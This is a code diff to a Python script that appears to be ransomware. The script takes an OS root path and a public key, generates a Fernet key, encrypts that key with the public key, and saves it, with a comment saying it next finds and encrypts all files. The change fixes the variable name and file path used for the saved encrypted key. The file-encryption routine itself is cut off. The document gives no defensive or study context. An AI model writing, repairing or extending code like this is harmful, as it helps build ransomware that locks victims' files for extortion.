@@ -30,10 +30,10 @@ if __name__ == "__main__":
     args = parser.parse_args()
     public_key_file = args.public_key_file
     os_root_path = args.os_root_path
-    key = args.enc_sym_key + "key"
+    enc_sym_key = args.enc_sym_key + "key"
 
     # check if the key already exists, if it does then don't encrypt again
-    if not os.path.exists(key):
+    if not os.path.exists(enc_sym_key):
 
         # generate the sym key
         key = Fernet.generate_key()
@@ -45,7 +45,7 @@ if __name__ == "__main__":
         )
 
         # save the encrypted sym key
-        with open("key", 'wb') as f:
+        with open(enc_sym_key, 'wb') as f:
             f.write(encrypted_key)
 
         # find all files and encrypt them
